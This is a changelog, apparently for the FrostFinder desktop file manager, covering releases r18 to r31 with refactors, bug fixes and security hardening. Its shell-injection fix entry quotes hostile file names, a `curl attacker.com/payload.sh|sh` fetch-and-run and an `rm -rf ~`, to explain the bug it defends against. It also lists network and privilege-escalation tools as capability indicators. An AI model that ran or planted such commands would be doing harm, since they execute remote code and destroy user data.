A **Community plugins** `<details>` section added above the Starter plugins section in the
Plugin Manager. On first expand it fetches `registry.json` from the FrostFinder GitHub repo.
Each registry entry shows name, description, command preview, and an "+ Add" button.
Install deduplicates by name, auto-detects capabilities, and saves via `invoke('save_plugins')`.
Network errors show an inline error message rather than crashing.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.30` / `r30` | `6.0.31` / `r31` |

---

## What's in 6.0.30 (Beta 6, r30) — Phase 3: UX & Power-User Polish

**Files changed:** `src/undo.js`, `src/main.js`, `src-tauri/src/main.rs`,
`src-tauri/src/tags.rs`, `src-tauri/Cargo.toml`, `src-tauri/capabilities/main.json`,
`scripts/check-locales.js`
**Rust recompile required:** Yes (`tauri-plugin-notification`, new Rust commands)

---

### P3.1 — Persistent undo history across sessions

The undo stack was in-memory only, capped at 50 entries, and lost on every app restart.
A destructive operation you only noticed *after* reopening FrostFinder was unrecoverable.

**Changes:**
- Three new Rust commands: `save_undo_history(history)`, `load_undo_history()`, `clear_undo_history()`
  — serialize to `~/.local/share/frostfinder/undo-history.json`
- `undo.js`: `persistUndoHistory()` called automatically on every `pushUndo()` (fire-and-forget)
- `undo.js`: `restoreUndoHistory()` called in `init()` — merges saved history into the current stack
- `undo.js`: `clearUndoHistory()` exported for Settings
- Stack cap raised **50 → 200 entries** (persisted cap, Rust-enforced server-side as safety net)
- **Settings → Advanced** gains a "Clear undo history (N steps)" row

---

### P3.2 — Redo support for New Folder / New File

`create` was the only op in the undo table without redo. The "cannot redo create" toast
has been replaced with functional redo:
- `pushUndo` for create ops now stores an `isDir` flag alongside `srcDir` and `newName`
- Redo calls `create_directory` or `create_file_cmd` with the original `{path, name}` params
- Falls back to the warning toast only if the Rust command throws (e.g. name conflict)

---

### P3.3 — Desktop notifications for long operations

`tauri-plugin-notification = "2"` added. When a copy, move, or trash operation completes
**while the FrostFinder window is not focused**, a system notification fires:

- `notifyOpComplete(title, body)` JS helper — checks `_appFocused` before requesting permission
- Permission is requested lazily on first notification (one-time OS prompt)
- Gracefully no-ops if the notification API is unavailable
- Wired into: clipboard paste completion, `deleteEntries` trash completion

---

### P3.4 — Translation value quality gate

`scripts/check-locales.js` now enforces a **70% translated threshold**:
- Locales below 70%: `⚠` warning logged, **exits 1** (blocks CI merge)
- Locales 70–99%: `✓` with advisory untranslated count (non-blocking)
- Fully translated locales: `✓ fully translated`

The 70% floor ensures newly contributed translations are actually useful before they
ship — a 10% translated locale causes more UX harm than no translation at all.

---

### P3.5 — Plugin import / export ✅ Already done (r27)

---

### P2.3 final cleanup — search_by_tag_v2

`search_by_tag_v2` added to `tags.rs`, backed by the SQLite `file_tags` table.
All three remaining JS callers (`main.js` ×2, `views.js` ×1) updated from
`invoke('search_by_tag')` → `invoke('search_by_tag_v2')`.
The v1 JSON tag store is now fully retired from the active call path.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.29` / `r29` | `6.0.30` / `r30` |
| `Cargo.toml` | — | Added `tauri-plugin-notification = "2"` |

---

## What's in 6.0.29 (Beta 6, r29) — Phase 2: Module Splits (continued)

**Files changed:** `src/main.js`, `src/undo.js`, `src/settings.js` (new), `src/network.js` (new),
`src/plugins.js` (new), `src-tauri/src/main.rs`, `src-tauri/src/trash.rs` (new), `src-tauri/src/search.rs` (new)
**Rust recompile required:** Yes

---

### P2.1 Stage 2 — Remove undo stubs from main.js

The 6 local function copies of `pushUndo`, `undoLastOp`, `redoLastOp`, `toggleUndoPanel`,
`renderUndoPanel`, and `undoToIndex` were deleted from `main.js`. They are now canonical
in `src/undo.js` and imported at the top of `main.js`. All call-sites work unchanged
because the module exports bind identically to the old global functions.

---

### P2.1 Stage 3 — settings.js (64 lines)

Extracted: `loadPersistentSettings`, `persistSettings`, `patchLocalStorage`.

The `patchLocalStorage` IIFE (which monkey-patches `localStorage.setItem` to auto-persist
every `ff_*` key write to the Rust settings store) is now an explicit exported function
called once in `init()`, making the side-effect visible rather than implicit.

---

### P2.1 Stage 4 — network.js (455 lines)

Extracted: `showSftpDialog`, `showFtpDialog`, `showVaultDialog`, `showCloudDialog`, `CLOUD_PROVIDERS`.

The four network-mount dialogs are the most self-contained feature block in the codebase —
they are UI-only (no shared state mutations) and communicate exclusively through `invoke()`.
Moving them out immediately makes `main.js` 600+ lines shorter and gives these dialogs a
natural home for future test coverage.

---

### P2.1 Stage 5 — plugins.js (499 lines)

Extracted: `_pluginDetectCapabilities`, `_revokePluginTrust`, `_showPluginManager`, `loadPlugins`,
`matchesGlob`, `pluginsForEntry`, `runPlugin`, `_showPluginOutput`, `_showPluginParamDialog`,
`showPluginManager`, `_plugins` variable.

`getPlugins()` and `setPlugins()` accessors added so the inline `window._editPlugin` handler
remaining in `main.js` can reach the module-level `_plugins` array without a direct import
of the mutable variable.

A leftover `matchesGlob` body fragment — orphaned by the extraction boundary — was found and
cleaned from `main.js`.

---

### P2.2 Stage 2 — trash.rs (125 lines)

Extracted: `TrashItem`, `TrashConflict`, `RestoreInstruction` structs and `trash_items`,
`trash_list`, `trash_item_count`, `check_trash_restore_conflicts`, `trash_restore_with_resolution`.

Duplicate `struct` definitions (both `pub` and non-`pub` versions were present from older
refactoring) were deduplicated during extraction.

---

### P2.2 Stage 3 — search.rs (274 lines)

Extracted: `DeepSearchResult`, `IndexEntry`, `IndexSearchResult`, `SearchResultV2` structs
and `search_index_store`, `deep_search`, `deep_search_dir`, `index_home_dir`, `index_walk`,
`index_apply_event`, `search_index_query`, `search_files`, `search_recursive`, `search_advanced`.

`search.rs` depends on `crate::FileEntry` (still in `main.rs`) — declared via `use crate::FileEntry`.

---

### Net reduction

| File | Before (r27) | After (r29) | Change |
|---|---|---|---|
| `src/main.js` | 7,278 lines | 6,300 lines | **−978 (−13%)** |
| `src-tauri/src/main.rs` | 8,325 lines | 7,666 lines | **−659 (−8%)** |
| New JS modules | — | 5 files / 1,147 lines | extracted |
| New Rust modules | — | 3 files / 815 lines | extracted |

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.28` / `r28` | `6.0.29` / `r29` |

---

## What's in 6.0.28 (Beta 6, r28) — Phase 2: Architecture Refactor

**Files changed:** `src-tauri/src/main.rs`, `src-tauri/src/tags.rs` (new),
`src/undo.js` (new), `src/main.js`, `src/types/tauri-commands.d.ts` (new),
`scripts/generate-types.js` (new), `src-tauri/Cargo.toml`
**Rust recompile required:** Yes (new module `tags.rs`, new specta-export feature)

---

### P2.3 — Retire v1 JSON tag store

The v1 tag system used two flat JSON files (`tags.json` and `tag_colors.json`) alongside
the SQLite `tags.db`. The dual-storage inconsistency caused silent failures (xattr writes
bypassing the JSON store entirely) and confused the tag sidebar.

**Changes:**
- `tag_colors` table added to the SQLite schema alongside `file_tags`
- Four new Rust commands:
  - `get_tags_with_colors_v2` — reads from SQLite + JSON fallback for xattr-only files
  - `set_tag_color_v2` — writes to SQLite `tag_colors` table
  - `get_all_tags_v2` — enumerates unique tags from SQLite
  - `migrate_tags_to_sqlite` — one-shot idempotent migration of `tags.json` + `tag_colors.json` → SQLite
- All JS callers updated: `invoke('get_tags_with_colors')` → `get_tags_with_colors_v2`,
  `invoke('set_tag_color')` → `set_tag_color_v2`
- Migration runs silently at 15s after startup alongside the existing `cleanup_tag_db` sweep
- The v1 commands (`get_tags_with_colors`, `set_tag_color`) are kept in the handler for
  backward compatibility but their implementations still exist in `tags.rs`

---

### P2.4 — Typed IPC contract

`scripts/generate-types.js` (new, 120 lines):
- Parses `src-tauri/src/main.rs` with a regex-based Rust→TypeScript type mapper
- Emits `src/types/tauri-commands.d.ts` with 141 typed invoke() overloads
- Run: `npm run gen-types` to regenerate, `npm run gen-types:check` in CI
- Rust→TS type map covers: String, bool, numerics, Vec<T>, Option<T>, Result<T,E>, named structs
- `specta-export` feature added to `Cargo.toml` as optional for future tauri-specta integration

---

### P2.1 Stage 1 — Extract undo.js

`src/undo.js` (129 lines, new ES module):
- Extracts `pushUndo`, `undoLastOp`, `redoLastOp`, `undoToIndex`, `toggleUndoPanel`, `renderUndoPanel`
- Exposes `initUndoDeps({ state, showToast, t, refreshColumns, escHtml })` for dependency injection
- Wired in `init()` via `initUndoDeps(…)` call
- Original functions kept in `main.js` as local copies for this revision (stage 2 will remove them once all callers are updated)

---

### P2.2 Stage 1 — Extract tags.rs

`src-tauri/src/tags.rs` (416 lines, new Rust module):
- Extracts all tag storage: v1 JSON helpers, v2 SQLite helpers, xattr helpers, tag colour store,
  `FileTag` struct, and all 18 tag-related Tauri commands
- `pub mod tags; pub use tags::*;` in `main.rs` re-exports all symbols so zero callers need changes
- 28 duplicate function blocks removed from `main.rs`
- `main.rs` reduced by **285 lines** (8,325 → 8,040)

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.27` / `r27` | `6.0.28` / `r28` |
| `Cargo.toml` | — | Added `specta`, `specta-typescript`, `tauri-specta` as optional deps; `specta-export` feature |

---

## What's in 6.0.27 (Beta 6, r27) — Phase 1: Security & Stability Foundations

**Files changed:** `src/main.js`, `src-tauri/src/main.rs`, `AGENTS.md`
**Rust recompile required:** Yes (new `revoke_plugin_trust` command)

---

### P1.1 — Shell injection via plugin variable interpolation (SECURITY)

**Severity: Critical.** A file named `$(curl attacker.com/payload.sh|sh)` or
`` `rm -rf ~` `` would execute arbitrary code the moment any plugin ran on it, because
variable substitution was bare string `.replace()` fed directly into `sh -c`.

**Fix:** All four variables are now single-quote–wrapped before shell expansion:
```js
const _sq = s => "'" + String(s).replace(/'/g, "'\''") + "'";
// {path} → '/home/user/my file.txt'   (safe even with spaces, $, `, ;, &, |)
// A file named: it's a "test" → becomes: 'it'\''s a "test"'
```
This is the standard POSIX shell-quoting technique — single quotes are literal in sh
except for `'` which cannot appear inside single quotes and must be escaped as `'\''`.

**Added:** "Dry run preview" button in the Plugin Manager form. Enter a command, click
it, and see the fully-expanded shell string with an example placeholder path
(`/home/user/example file.txt`) before the plugin is saved.

---

### P1.2 — Plugin capability model (SECURITY / UX)

**Auto-detection:** `_pluginDetectCapabilities(cmd)` scans the command string for
indicators of privilege escalation, network access, and broad file-system writes:

| Indicator | Capability label |
|---|---|
| Any plugin | `shell` (always) |
| `curl`, `wget`, `ssh`, `http`, … | `network` |
| `rm`, `mv`, `cp`, `dd`, `chmod`, … | `files:write` |
| `sudo`, `su`, `pkexec`, `doas` | `elevated` |

**Trust dialog** now shows the detected capabilities before asking for approval.

**Plugin list rows** show grey capability badges (`shell`, `network`, …) under each command.

**Revoke Trust button** — each plugin row has an orange "Revoke" button. Clicking it calls
the new `revoke_plugin_trust` Rust command, removing the stored hash so the plugin
re-prompts on next run. Trust is also auto-revoked when a plugin is deleted.

**Export / Import** — Plugin Manager header now has Export and Import buttons:
- **Export:** saves all plugins to a user-chosen `.json` file via `saveDialog`
- **Import:** opens a `.json` file, validates each entry, merges with dedup by `id`,
  re-detects capabilities on every imported plugin (no trust poisoning from shared files)

---

### P1.3 — Per-window vs. global state contract (ARCH / DOCS)

Added a formal contract table to `AGENTS.md` documenting which keys belong in
`localStorage` (global preferences) vs. `sessionStorage` (per-window instance state),
with a contributor decision rule. Prevents the class of bugs fixed in r21–r23.

---

### P1.4 — Stale ARIA gap note corrected (DOCS)

`MEMORY.md` still said "Known gaps: view mode switches, trash count, toast live region,
dual-pane pane switch" — these were all closed in r71 and are covered by automated
tests in `a11y.test.js`. Note updated to reflect reality.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.26` / `r26` | `6.0.27` / `r27` |

---

## What's in 6.0.26 (Beta 6, r26) — Compile fix for r25 lofty integration

**Files changed:** `src-tauri/src/main.rs`
**Rust recompile required:** Yes

Three compiler errors from the r25 lofty integration, fixed exactly as `rustc` advised:

| Error | Location | Fix |
|---|---|---|
| `E0433` — `ItemKey` not in `items` | `get_audio_tags` line 6348 | `lofty::tag::items::ItemKey` → `lofty::prelude::ItemKey` |
| `E0433` — `ItemKey` not in `items` | `write_audio_tags` line 6388 | Same correction |
| `E0599` — `save_to_path` not in scope | `write_audio_tags` line 6391 | Added `AudioFile` to `use lofty::prelude::{…}` import |

No logic changes. r25 functionality is unchanged.

---

## What's in 6.0.25 (Beta 6, r25) — Phase 17: Native Audio Tag Editing

**Files changed:** `src-tauri/Cargo.toml`, `src-tauri/src/main.rs`, `src/views.js`
**Rust recompile required:** Yes — new `lofty` crate dependency must be compiled

---

### Problem

The audio tag editor ("Edit Tags") called `exiftool` via `Command::new("exiftool")` for
both reading and writing. `exiftool` is an optional Perl-based system tool that is
not installed on most systems. The result was the error shown in the screenshot:

> `Could not load tags: exiftool not found or failed: No such file or directory (os error 2)`
> `Is exiftool installed?`

No core file manager feature should depend on optional system binaries that users must
install separately.

---

### Fix — Native Rust audio tags via `lofty`

Added `lofty = "0.22"` to `Cargo.toml`. Lofty is a pure-Rust audio metadata library
with zero system dependencies. It supports the full FrostFinder `AUDIO_EXTS` set:

| Format | Tag standard | lofty support |
|---|---|---|
| `.mp3` | ID3v1, ID3v2.2/2.3/2.4 | ✓ |
| `.flac` | Vorbis Comment | ✓ |
| `.ogg` | Vorbis Comment | ✓ |
| `.opus` | Opus Comment (Vorbis) | ✓ |
| `.m4a` / `.aac` | iTunes atoms (MP4) | ✓ |
| `.wav` | ID3v2 / RIFF INFO | ✓ |
| `.weba` | WebM/Matroska tags | ✓ |

---

### New Tauri commands

#### `get_audio_tags(path: String) → AudioTags`

Returns `{ title, artist, album, year, track, genre, comment }` as optional strings.
Reads from the file's primary tag (format-native). Falls back to the first available
tag block if no primary is set. Returns all-null struct for untagged files (no error).

#### `write_audio_tags(path: String, tags: AudioTags) → ()`

Accepts the same struct. Creates a tag block if the file has none, using the
format-native type (ID3v2 for MP3, VorbisComment for FLAC/OGG, iTunes atoms for M4A).
Only modifies fields that are `Some(_)` — `null` fields are left untouched.
Uses `lofty::config::WriteOptions::default()` (preserves other tag blocks).

---

### JS changes (`src/views.js`)

`_showAudioTagEditor` updated:
- `invoke('get_file_meta_exif')` → `invoke('get_audio_tags')`
- `invoke('write_file_meta_exif')` → `invoke('write_audio_tags')`
- Field object changed from `[[tag, val], …]` to `{ title, artist, album, … }`
- **Comment field added** — was missing from the previous editor
- Placeholder text added to all fields for clarity
- Error message no longer mentions `exiftool`

---

### Scope note

The **EXIF image editor** and **PDF metadata editor** still call `exiftool` — those
formats have more complex metadata structures that benefit from exiftool's breadth.
They will be migrated to native solutions in a future revision.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.24` / `r24` | `6.0.25` / `r25` |
| `Cargo.toml` | — | Added `lofty = "0.22"` |

---

## What's in 6.0.24 (Beta 6, r24) — Phase 16: Bug Fixes (screenshot audit)

**Files changed:** `src/main.js`, `src/style.css`, `src-tauri/src/main.rs`
**Rust recompile required:** Yes (`scan_icon_folder` rewritten)

---

### Bug 1 — Split pane close leaves view half-width

When `_toggleSplitPane()` opens the pane, `_initSplitDivider()` sets
`view-host.style.flex = "0 0 50%"` as an inline style. On close, `pane-b` and
`split-divider` were hidden but the inline override was never cleared, so
`view-host` remained pinned at 50% width even with only one pane visible.

**Fix:** Clear the inline style on close:
```js
const viewHost = document.getElementById('view-host');
if (viewHost) viewHost.style.flex = '';
```

---

### Bug 2 — Icon theme "Load from folder" only scans top level

`scan_icon_folder` used `std::fs::read_dir` (one level deep). Icon packs that
store their SVGs in subdirectories (e.g. `scalable/places/folder.svg`,
`48x48/apps/`) would return 0 hits.

**Fix:** Rewritten to walk the full directory tree recursively up to depth 8.
First match wins — if `folder.svg` exists in both `16x16/` and `48x48/`, the
shallower path is used. A depth guard prevents runaway symlink trees.

---

### Fix 3 — Settings panel redesign

The Settings dialog was built entirely with inline `style=` strings, making it
unmaintainable and visually inconsistent. Replaced with a clean CSS class system:

| New class | Purpose |
|---|---|
| `.stg-dialog` | Outer card — `700px × 540px`, `border-radius:16px` |
| `.stg-sidebar` | Left nav — `168px` wide, subtle separator |
| `.stg-sidebar-title` | "Settings" heading — `13.5px`, weight 700 |
| `.stg-nav-btn` | Nav item — hover + `.active` states via CSS |
| `.stg-main` | Right content area |
| `.stg-header` | Title bar row with close button |
| `.stg-header-title` | Section title — `15px`, weight 600 |
| `.stg-close-btn` | `32×32` button with border, hover animation |
| `.stg-content` | Scrollable body — `18px 24px` padding |

Settings row improvements:
- Label text: `#94a3b8` → `#c8d0dc` (fully readable, no squinting)
- Row `min-height: 42px` so controls never feel cramped
- `.stg-select` gains `min-width: 140px` — language dropdown no longer appears blank
- `.stg-num` widened from `70px` → `80px`
- Focus rings on both input types (`border-color: rgba(91,141,217,.6)`)
- Group cards: `border-radius: 11px`, label moved inside card with bottom border separator

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.23` / `r23` | `6.0.24` / `r24` |

---

## What's in 6.0.23 (Beta 6, r23) — Phase 15: Bug Fixes (screenshot audit)

**Files changed:** `src-tauri/capabilities/main.json`, `src/main.js`, `src/style.css`
**Rust recompile required:** Yes (capabilities change)

---

### Bug 1 — "Load from folder" shows permission error

The icon theme picker's "Load from folder…" button calls `@tauri-apps/plugin-dialog` `open()`.
`capabilities/main.json` only granted `dialog:allow-save`, not `dialog:allow-open`.
The error shown in the UI was:

> `dialog:allow-open not allowed. Permissions associated with this command: dialog:allow-open, dialog:default`

**Fix:** Replace `"dialog:allow-save"` with `"dialog:default"` which grants the full set
(`allow-open`, `allow-save`, `allow-ask`, `allow-confirm`, `allow-message`).

---

### Bug 2 — Split pane opens blank

`_toggleSplitPane()` called `_renderPaneB()` directly after setting `_paneB.path`.
At that point `_paneB.columns` is still `[]`, so `_renderPaneB()` hit its early-exit
guard (`if(!_paneB.path || !_paneB.columns.length)`) and rendered the empty state.

**Fix:** Call `_navigatePaneB(_paneB.path)` instead — this fetches directory entries
via `listDirectoryFullStreamed`, populates `_paneB.columns`, then calls `_renderPaneB()`.

---

### Fix 3 — Split pane toolbar button

The `btn-split-pane` click handler existed in the `.vbtn` loop but the button was never
rendered into the toolbar HTML. Added a split-pane icon button to the view-switcher group,
visually separated from the view mode buttons by a subtle left border divider.

- Active state: blue tint matching accent colour (`rgba(91,141,217,.18)`)
- Tooltip: `Split pane (Ctrl+\\)`
- CSS classes: `.vbtn .vbtn-split` (+ `.active` when `_paneB.active`)

---

### Fix 4 — Progress bar overlaps Settings / Cheatsheet footer

`#sb-ops-progress` used `position:absolute; bottom:0` and slid up via `translateY(100%)`.
When visible it sat on top of the sticky footer, covering the Settings and Cheatsheet buttons.

**Fix:** Offset `bottom: 52px` (footer height) so the bar is always above the footer.
The hidden start position is adjusted to `translateY(calc(100% + 52px))` so it still slides
in cleanly from fully off-screen. A bottom border was added so the bar has a clean edge.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.22` / `r22` | `6.0.23` / `r23` |

---

## What's in 6.0.22 (Beta 6, r22) — Phase 14: Bug Fixes (UI/UX)

**Files changed:** `src/main.js`, `src/utils.js`, `src/style.css`
**Rust recompile required:** No

---

### Overview

r22 resolves four bugs discovered from user screenshots of the running app.
No new features were added beyond the cheatsheet button which fills a pre-existing
UX gap (the shortcut was always there, but had no sidebar affordance).

---

### Bug 1 — New window blank, title shows folder name of *previous* window

**Root cause:** `init()` calls `restoreSession()` unconditionally. `restoreSession()` reads
`ff_session` from `localStorage`, which is **shared across all windows** in the same
Tauri origin. A new window therefore loaded all of the main window's tabs, navigated
each one (often failing), and then `window.__initialPath` tried to navigate again on top
of the broken state — leaving the window empty.

**Fix:** Detect a new window via `window.__initialPath` and skip `restoreSession()` entirely:

```js
const _isNewWindow = !!window.__initialPath;
const _sessionRestored = _isNewWindow ? false : await restoreSession(home);
if (!_sessionRestored && !_isNewWindow) {
  await navigate(home, 0, true);
}
```

---

### Bug 2 — Split pane stuck open / Ctrl+\\ won't retract in new window

**Root cause:** `ff_split_active` was written to `localStorage` (shared). On load, line 2638
auto-triggered `_toggleSplitPane()` whenever `ff_split_active === '1'` — even in new
windows where the split pane had never been opened. The pane opened into an uninitialised
state with no content and couldn't be closed because `Ctrl+\\` toggled it off, then
the shared `localStorage` key triggered it open again on the next render cycle.

**Fix:** Move `ff_split_active` read/write to `sessionStorage` (per-window, not shared):

```js
// Save
sessionStorage.setItem('ff_split_active', _paneB.active ? '1' : '0');
// Restore
if (sessionStorage.getItem('ff_split_active') === '1') setTimeout(() => _toggleSplitPane(), 400);
```

---

### Fix 3 — Cheatsheet button added to sidebar footer

A ⌨ keyboard-icon button was added beside the Settings button in the sidebar footer.
It is wired to `showCheatSheet()` (same as `Ctrl+?`) so users can discover the shortcut
reference without knowing the keyboard shortcut for it.

The footer was refactored from a single full-width button to a flex row:
- Settings button keeps its label and takes all remaining space (`flex:1`)
- Cheatsheet button is a compact `32×32px` square icon button

New CSS classes: `.sb-footer-row`, `.sb-cheatsheet-btn`

---

### Fix 4 — Icon theme picker: remove / unload button

The icon theme picker now shows a red `✕` button beside the active disk theme row.
Clicking it calls `setIconTheme('builtin')` and closes the dialog, reverting to the
built-in SVG set and clearing `ff_iconTheme` + `ff_diskThemeSvgs` from `localStorage`.

Previously the only way to unload a disk theme was to click "Built-in" in the picker,
which was easy to miss because the active theme row covered it visually.

---

### Version bumps

| File | Old | New |
|---|---|---|
| `VERSION` | `r21` | `r22` |
| `package.json` | `6.0.21` | `6.0.22` |
| `src-tauri/Cargo.toml` | `6.0.21` | `6.0.22` |
| `src-tauri/tauri.conf.json` | `6.0.21` | `6.0.22` |
| `PKGBUILD` | `6.0.21` | `6.0.22` |
| `packaging/homebrew/frostfinder.rb` | `6.0.21` | `6.0.22` |
| `packaging/winget/FrostFinder.FrostFinder.yaml` | `6.0.21` | `6.0.22` |
| `com.frostfinder.desktop.json` | `v6.0.21` | `v6.0.22` |

---

## What's in 6.0.21 (Beta 6, r21) — Phase 13: Bug Fixes & Extension Parity

**Files changed:** `src/test/utils.test.js`, `src/test/a11y.test.js`, `src/utils.js`, `src/views.js`, `CONTRIBUTING.md`
**Rust recompile required:** No

---

### Overview

r21 is a pure bug-fix release identified during a full line-by-line code audit. No new
features were added. Three correctness issues and one packaging gap were resolved.

---

### Bug Fixes

#### Bug 1 — `src/test/utils.test.js`: `afterEach` not imported (critical test failure)

`afterEach` was used in the `fmtDate` relative-time branch suite and the
`setDateLocale` suite but was not present in the `vitest` import on line 5:

```js
// Before (broken)
import { describe, it, expect, beforeEach, vi } from 'vitest';

// After (fixed)
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
```

**Impact:** `ReferenceError: afterEach is not defined` at runtime. All 11 test cases in
those two suites were silently failing, meaning the fake-timer cleanup was never running
and subsequent suites could observe leaked timer state.

---

#### Bug 2 — `src/test/a11y.test.js`: `afterEach` not imported (critical test failure)

Identical issue — `afterEach` was called on lines 304, 389, and 517 but missing from
the vitest import on line 22. Same fix applied.

**Impact:** Same `ReferenceError`. DOM cleanup (`document.getElementById(…).remove()`)
and timer resets never ran between test suites, risking false positives in later axe-core
ARIA validation cases.

---

#### Bug 3 — `src/utils.js`: `VIDEO_EXTS` missing `flv`, `wmv`, `3gp`

The shared `VIDEO_EXTS` constant only listed 7 formats while the Rust `make_thumbnail`
handler (introduced in r72) supports 11:

```
Rust:     mp4  mkv  webm  avi  mov  ogv  m4v  flv  ts  wmv  3gp
utils.js: mp4  mkv  webm  avi  mov  ogv  m4v  ─    ─   ─    ─
```

`flv`, `wmv`, and `3gp` files were silently excluded from thumbnail queuing in the
icon view — `needThumb` never included them — so they would always show the generic
file icon and never receive the play-badge overlay. (`ts` is intentionally absent from
the shared constant because `.ts` is TypeScript in `TEXT_EXTS`; the TS video container
is handled separately in the codec-badge local set.)

```js
// Before
export const VIDEO_EXTS = ['mp4','mkv','webm','avi','mov','ogv','m4v'];

// After
export const VIDEO_EXTS = ['mp4','mkv','webm','avi','mov','ogv','m4v','flv','wmv','3gp'];
```

---

#### Bug 3b — `src/views.js`: codec badge `VIDEO_EXTS_SET` missing `3gp`

The local `VIDEO_EXTS_SET` inside `injectVideoCodecBadge()` was also missing `3gp`,
meaning the codec probe was never triggered for `.3gp` files in the preview panel:

```js
// Before
new Set(['mp4','mkv','avi','mov','webm','flv','wmv','m4v','ts','vob','ogv'])

// After
new Set(['mp4','mkv','avi','mov','webm','flv','wmv','m4v','ts','vob','ogv','3gp'])
```

---

### Documentation fixes (recovered from r17)

Two pre-existing omissions in `CONTRIBUTING.md` were corrected while restoring
files missing from the r20 source archive:

**Missing test file** — `a11y.test.js` was not listed in the "Code changes" step 3
test file comment. It has been present since r13 (Beta 6).

**Missing language** — Arabic (`ar`) was added in Beta 5 (r74–r78) but was absent from
the "Current language status" table. The table and summary sentence now include it.

---

### Version bumps

| File | Old | New |
|---|---|---|
| `VERSION` | `REVISION=20` / `BUILD_NAME=…r20…` | `REVISION=21` / `BUILD_NAME=…r21…` |
| `package.json` | `6.0.20` | `6.0.21` |
| `src-tauri/Cargo.toml` | `6.0.20` | `6.0.21` |
| `src-tauri/tauri.conf.json` | `6.0.20` | `6.0.21` |
| `PKGBUILD` | `6.0.1` | `6.0.21` |
| `packaging/homebrew/frostfinder.rb` | `6.0.1` | `6.0.21` |
| `packaging/winget/FrostFinder.FrostFinder.yaml` | `6.0.1` | `6.0.21` |
| `com.frostfinder.desktop.json` | `v6.0.1` tag | `v6.0.21` tag |
| `packaging/com.frostfinder.desktop.metainfo.xml` | latest entry `6.0.1` | new entry `6.0.20` prepended |

---

## What's in 6.0.20 (Beta 6, r20) — Phase 12: Test Coverage Expansion

**Files changed:** `src/test/utils.test.js`
**Rust recompile required:** No

---

### Overview

Phase 12 closes coverage gaps in `src/test/utils.test.js`.  All previously
untested exports in `utils.js` now have dedicated suites.  No production code
was changed.

**Test count before:** 162 cases across 4 files
**Test count after:** 196 cases across 4 files (+34 new cases, +8 new suites)

---

### New suites added to `utils.test.js`

#### `fmtDate` — relative time branches (7 cases)
The existing 3 cases only checked falsy guards and a loose string-match.
The 6 output branches are now each pinned with `vi.useFakeTimers()` so
CI results are deterministic regardless of when the suite runs:

| Branch | Condition | Example output |
|---|---|---|
| Just now | < 1 minute ago | `Just now` |
| X min ago | 1–59 minutes ago | `5 min ago` |
| Today | same calendar day, > 1 h ago | `Today, 2:34 PM` |
| This week | < 7 days, not today | `Monday` |
| This year | ≥ 7 days, same year | `Mar 12` |
| Older | previous year | `Mar 22, 2025` |

#### `fmtDateAbsolute` (3 cases)
Zero prior coverage. Tests: falsy guard returns `--`, year appears in
output, time component (`HH:MM`) is present.

#### `setDateLocale` (4 cases)
Zero prior coverage. Tests: no-throw for valid BCP-47 tags (`de-DE`,
`ja`, `ar`), graceful no-throw for `null`/`""`, observable effect on
subsequent `fmtDate` output.

#### `fmtDriveSpace` (5 cases)
Zero prior coverage. Tests: zero/missing total returns `""`, 50% usage
formats all three fields (used / total / percent), 100% full, 0% empty,
percentage rounds to nearest integer.

#### `driveColor` (7 cases)
Zero prior coverage. All 6 named drive types (`usb`, `network`, `optical`,
`nvme`, `ssd`, `hdd`) return their documented hex colour; unknown type
returns grey fallback `#94a3b8`.

#### `driveTypeBadge` (7 cases)
Zero prior coverage. All 6 badge strings (`USB`, `NET`, `OPT`, `NVMe`,
`SSD`, `HDD`) verified; unknown type returns `""`.

#### `favColor` (2 cases)
Zero prior coverage. All 8 named icon keys verified; unknown key and
`undefined` return grey fallback.

---

## What's in 6.0.19 (Beta 6, r19) — Phase 11: Robustness

**Files changed:** `src-tauri/src/main.rs`
**Rust recompile required:** Yes

---

### Fix 1 — Mutex/RwLock poisoning cascades (`main.rs`)

Every production `.lock().unwrap()`, `.read().unwrap()`, and `.write().unwrap()`
call on a shared static would re-panic if a different thread had previously panicked
while holding the same lock — making a single thread crash unrecoverable and taking
down the entire Tauri process.

28 call sites across 6 statics were hardened:

| Static | Type | Sites fixed |
|---|---|---|
| `search_index_store()` | `RwLock` | 4 |
| `DIR_CACHE` | `RwLock` | 3 |
| `ACTIVE_WATCHER` | `Mutex` | 4 |
| `tag_db()` | `Mutex` | 9 |
| `SFTP_MOUNTS` | `Mutex` | 4 |
| `FTP_MOUNTS` | `Mutex` | 4 |

All sites now use `.unwrap_or_else(|e| e.into_inner())`, which recovers the
inner guard from a poisoned lock and continues rather than re-panicking.

### Fix 2 — Inline regex recompilation in `mount_webdav` (`main.rs`)

`regex::Regex::new(r"[^\w]").unwrap()` was called inside the body of
`mount_webdav`, recompiling the regex object on every WebDAV mount operation.

- Pattern now compiled once via `OnceLock::get_or_init` into a `static NONWORD_RE`.
- Consistent with the existing `OnceLock` usage throughout the codebase
  (no new dependencies required).

### Fix 3 — Batch rename number overflow (`main.rs`)

In the `"number"` batch-rename mode, `start_num + i as u32` used wrapping
addition: if `start_num` is near `u32::MAX` and the batch is large enough,
the counter silently wraps to 0 and files get colliding names.

- Changed to `start_num.saturating_add(i as u32)` so the counter clamps at
  `u32::MAX` rather than wrapping.

---

## What's in 6.0.10 (Beta 6, r18) — Phase 10: Security Hardening Round 2

**Files changed:** `src-tauri/src/main.rs`
**Rust recompile required:** Yes

---

### Fix 1 — ZIP path-traversal escape via absolute entries (`main.rs`)

The previous sanitiser (`replace("..", "_")`) was bypassed by absolute-path ZIP entries
such as `/etc/passwd`: `Path::join()` silently discards the base directory when given an
absolute component, allowing extraction outside the chosen destination.

- New `safe_join_zip(base, raw_entry)` helper: walks every path component via
  `Path::components()`; only `Normal` and `CurDir` variants are accepted; `RootDir`,
  `ParentDir`, and `Prefix` (Windows drive letters) all cause the entry to be skipped.
- Base directory is resolved with `fs::canonicalize()` before iteration; a final
  `starts_with(dest_canonical)` check provides belt-and-suspenders insurance.
- Entry display name shown in progress events is now derived from the safe resolved path,
  not the raw archive name string.

